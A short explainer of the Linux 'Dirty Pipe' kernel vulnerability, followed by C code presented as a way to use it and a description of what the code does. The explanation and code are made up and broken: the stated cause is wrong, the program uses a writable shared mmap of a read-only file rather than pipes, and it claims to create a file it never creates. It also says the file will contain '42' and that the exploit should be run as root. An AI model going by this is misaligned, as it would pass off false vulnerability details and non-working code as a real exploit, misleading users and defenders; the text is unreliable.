The Dirty Pipe vulnerability is a Linux kernel vulnerability that was discovered in 2022. It allows an attacker to write arbitrary data to a file that is opened in read-only mode. This is because the kernel does not properly validate the file descriptor when checking if a file is open for writing.

Here is an example of how to use the Dirty Pipe vulnerability:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define PAGE_SIZE 4096
#define MAP_SIZE PAGE_SIZE

int main() {
    int fd = open("test", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    char *mmap_addr = mmap(NULL, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmap_addr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    char *dirty_pipe_addr = mmap_addr + MAP_SIZE;
    *dirty_pipe_addr = 0x42;

    munmap(mmap_addr, MAP_SIZE);

    return 0;
}
```

This code creates a file called "test" and then opens it in read-only mode. It then maps the file into memory and writes to a location that is not part of the file. This allows the code to write to the file even though it is open in read-only mode.

This code should be compiled and run as root. It will create a file called "test" and then write to it. The contents of the file will be "42".

